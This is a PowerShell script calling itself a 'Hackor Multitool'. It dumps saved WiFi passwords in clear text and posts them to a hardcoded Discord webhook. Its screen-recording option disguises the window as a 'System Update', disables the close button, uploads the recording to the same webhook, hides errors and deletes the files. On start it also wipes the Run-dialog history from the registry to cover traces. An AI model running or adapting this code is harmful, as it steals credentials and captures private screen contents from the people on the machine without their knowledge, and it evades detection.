# Define the function to show the menu
function Show-Menu {
    Clear-Host
    Write-Host @"
 ________  _______   ________  ________  _______   ________     
|\   ___ \|\  ___ \ |\   ___ \|\   ____\|\  ___ \ |\   ____\    
\ \  \_|\ \ \   __/|\ \  \_|\ \ \  \___|\ \   __/|\ \  \___|    
 \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \_____  \ \  \_|/_\ \  \       
  \ \  \_\\ \ \  \_|\ \ \  \_\\ \|____|\  \ \  \_|\ \ \  \____  
   \ \_______\ \_______\ \_______\____\_\  \ \_______\ \_______\
    \|_______|\|_______|\|_______|\_________\|_______|\|_______|
                                 \|_________|                   
                                                                
                                                                
"@
    Write-Host "================ Hackor Multitool ================"
    Write-Host "1: List WiFi Passwords"
    Write-Host "2: List USB Devices"
    Write-Host "3: Option Three"
    Write-Host "Q: Quit"
    Write-Host "==========================================="
}

Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force

# Define the main function that runs the menu loop
function Start-HackorMultitool {
    
    do {
        Show-Menu
        $selection = Read-Host "Please make a selection"
        switch ($selection) {
            '1' {
                Clear-Host
                Write-Host "================ Hackor Multitool -> WiFi Networks ================"
                Write-Host "Scanning saved WiFi Networks..."
                $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
                Write-Host $wifiProfiles
                Write-Host "1: Send to webhook"
                Write-Host "2: Back"
                $selection2 = Read-Host "Please make a selection"
                switch ($selection2) {
                    '1' {
                        $filePath = "$env:TEMP/--wifi-pass.txt"
                        $wifiProfiles | Out-File -FilePath $filePath
                        
                        $webhookUrl = "https://discord.com/api/webhooks/1098750753935474800/XSUW-ZgqQmr3zD9FwL1W2iwbtoDBqvX9Y-SzpR6HFQxUgRYal7YdPYjxAsxJaHz2ev7J"
                        $fileContent = Get-Content -Path $filePath -Raw
                        $payload = @{
                            content = "WiFi Passwords:`n$fileContent"
                        } | ConvertTo-Json
                        try {
                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                        }
                        catch {
                            Write-Host "Failed to send data to webhook: $_"
                        }
                        finally {
                            Remove-Item -Path $filePath -ErrorAction SilentlyContinue
                        }
                    }
                    '2' {
                        # Do nothing, just go back to main menu
                    }
                }
                pause
            }
            '2' {
                Clear-Host
                Write-Host "================ Hackor Multitool -> USB Devices ================"
                Write-Host "Listing all USB devices..."
                Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Format-Table -AutoSize
                Write-Host "Press any key to continue..."
                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
            }
            '3' {
                Clear-Host
                Write-Host "================ Hackor Multitool -> Screen Recording ================"
                $duration = Read-Host "Enter the duration of the screen recording in seconds"

                if ($duration -match '^\d+$') {
                    $tempPath = [System.IO.Path]::GetTempPath()
                    $outputFolder = Join-Path $tempPath "screen_capture_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
                    New-Item -ItemType Directory -Path $outputFolder -Force | Out-Null

                    Write-Host "Starting screen recording for $duration seconds..."
                    
                    try {
                        # Load required assemblies
                        Add-Type -AssemblyName System.Windows.Forms
                        Add-Type -AssemblyName System.Drawing

                        # Modify the current PowerShell window
                        $host.UI.RawUI.WindowTitle = "System Update"
                        $host.UI.RawUI.BackgroundColor = "DarkBlue"
                        $host.UI.RawUI.ForegroundColor = "White"
                        Clear-Host
                        Write-Host "`n`n`n`n`n`n`n`n"
                        Write-Host "                Updating Shell. Do not close or the update might corrupt" -ForegroundColor Yellow
                        Write-Host "`n`n`n`n`n`n`n`n"

                        # Disable close button
                        $signature = @"
                        [DllImport("user32.dll")]
                        public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
                        [DllImport("user32.dll")]
                        public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
                        [DllImport("kernel32.dll")]
                        public static extern IntPtr GetConsoleWindow();
"@
                        Add-Type -MemberDefinition $signature -Name Win32Utils -Namespace Win32
                        $hwnd = [Win32.Win32Utils]::GetConsoleWindow()
                        $hMenu = [Win32.Win32Utils]::GetSystemMenu($hwnd, $false)
                        [Win32.Win32Utils]::EnableMenuItem($hMenu, 0xF060, 0x00000001)

                        $startTime = Get-Date
                        $endTime = $startTime.AddSeconds($duration)

                        $frameCount = 0

                        # Get the size of the primary screen using WinAPI
                        Add-Type @"
                        using System;
                        using System.Runtime.InteropServices;

                        public class ScreenCapture
                        {
                            [DllImport("user32.dll")]
                            public static extern IntPtr GetDesktopWindow();

                            [DllImport("user32.dll")]
                            public static extern IntPtr GetWindowDC(IntPtr hWnd);

                            [DllImport("gdi32.dll")]
                            public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

                            [DllImport("user32.dll")]
                            public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

                            public static int[] GetScreenSize()
                            {
                                IntPtr hWnd = GetDesktopWindow();
                                IntPtr hDC = GetWindowDC(hWnd);
                                int width = GetDeviceCaps(hDC, 118); // DESKTOPHORZRES
                                int height = GetDeviceCaps(hDC, 117); // DESKTOPVERTRES
                                ReleaseDC(hWnd, hDC);
                                return new int[] { width, height };
                            }
                        }
"@

                        $screenSize = [ScreenCapture]::GetScreenSize()
                        $width = $screenSize[0]
                        $height = $screenSize[1]

                        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

                        while ((Get-Date) -lt $endTime) {
                            $bitmap = New-Object System.Drawing.Bitmap($width, $height)
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

                            # Capture cursor
                            $cursorPosition = [System.Windows.Forms.Cursor]::Position
                            $cursor = [System.Windows.Forms.Cursors]::Default
                            $cursor.Draw($graphics, [System.Drawing.Rectangle]::new($cursorPosition.X, $cursorPosition.Y, $cursor.Size.Width, $cursor.Size.Height))

                            $framePath = Join-Path $outputFolder "frame_$frameCount.png"
                            $bitmap.Save($framePath, [System.Drawing.Imaging.ImageFormat]::Png)

                            $graphics.Dispose()
                            $bitmap.Dispose()

                            $frameCount++
                            Start-Sleep -Milliseconds 10  # Adjust this value to control frame rate
                        }

                        $stopwatch.Stop()
                        $actualFps = $frameCount / $stopwatch.Elapsed.TotalSeconds

                        # Check if FFmpeg is installed
                        $ffmpegPath = "ffmpeg.exe"
                        if (-not (Get-Command $ffmpegPath -ErrorAction SilentlyContinue)) {
                            $ffmpegFolder = Join-Path $tempPath "ffmpeg"
                            $ffmpegPath = Join-Path $ffmpegFolder "ffmpeg.exe"

                            if (-not (Test-Path $ffmpegPath)) {
                                $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
                                $ffmpegZip = Join-Path $tempPath "ffmpeg.zip"

                                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip
                                Expand-Archive -Path $ffmpegZip -DestinationPath $ffmpegFolder -Force
                                Move-Item -Path (Join-Path $ffmpegFolder "ffmpeg-master-latest-win64-gpl\bin\*") -Destination $ffmpegFolder
                                Remove-Item -Path (Join-Path $ffmpegFolder "ffmpeg-master-latest-win64-gpl") -Recurse -Force
                                Remove-Item -Path $ffmpegZip -Force
                            }
                        }

                        $outputVideo = Join-Path $outputFolder "output.mkv"
                        
                        # Use MKV format with PCM audio, set the output framerate to match the recording
                        $ffmpegCommand = "& '$ffmpegPath' -y -framerate $actualFps -i '$outputFolder\frame_%d.png' -c:v libx264 -preset medium -crf 23 -r $actualFps -c:a pcm_s16le '$outputVideo'"
                        
                        $ffmpegOutput = Invoke-Expression $ffmpegCommand 2>&1
                        
                        if (Test-Path $outputVideo) {
                            # Upload video to Discord webhook
                            $webhookUrl = "https://discord.com/api/webhooks/1098750753935474800/XSUW-ZgqQmr3zD9FwL1W2iwbtoDBqvX9Y-SzpR6HFQxUgRYal7YdPYjxAsxJaHz2ev7J"
                            $fileName = [System.IO.Path]::GetFileName($outputVideo)
                            $fileBytes = [System.IO.File]::ReadAllBytes($outputVideo)
                            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
                            $boundary = [System.Guid]::NewGuid().ToString()
                            $LF = "`r`n"

                            $bodyLines = (
                                "--$boundary",
                                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
                                "Content-Type: application/octet-stream$LF",
                                $fileEnc,
                                "--$boundary--$LF"
                            ) -join $LF

                            try {
                                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
                            }
                            catch {
                                # Silently handle any upload errors
                            }
                        }

                        # Clean up
                        Remove-Item "$outputFolder\frame_*.png"
                        Remove-Item $outputVideo -ErrorAction SilentlyContinue
                        Remove-Item $outputFolder -Recurse -Force -ErrorAction SilentlyContinue
                    }
                    catch {
                        # Silently handle any errors
                    }
                    finally {
                        # Close all PowerShell windows
                        Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object { $_.CloseMainWindow() | Out-Null }
                    }
                }
                else {
                    Write-Host "Invalid duration. Please enter a valid number of seconds."
                    Start-Sleep -Seconds 2
                }
            }
            'q' {
                return
            }
        }
    } while ($selection -ne 'q')
}

# Run the main function
Start-HackorMultitool

# To make this script runnable from the Windows Run command, add this line at the end:
pause